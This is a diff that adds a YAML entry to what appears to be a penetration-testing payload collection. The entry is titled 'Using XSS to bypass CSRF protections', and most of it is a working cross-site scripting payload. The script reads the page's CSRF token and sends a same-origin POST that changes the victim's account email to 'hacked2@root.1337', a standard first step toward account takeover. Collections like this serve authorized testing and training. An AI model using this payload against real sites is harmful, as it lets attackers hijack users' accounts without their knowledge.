@@ -1,0 +1,19 @@
+name: Using XSS to bypass CSRF protections
+description: Using XSS to get the CSRF token and execute a CSRF protected action.
+commands:
+  - command: |
+      <script>
+      setTimeout(() => {
+          let token = document.getElementsByName('csrf')[0].value;
+          fetch('/my-account/change-email', { method: 'POST', credentials: 'same-origin', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: new URLSearchParams({email:"hacked2@root.1337", csrf: token})});    
+      }, 2000);
+      </script>
+    description:
+tags:
+  - xss
+  - csrf
+show:
+links:
+  -
+references:
+  -
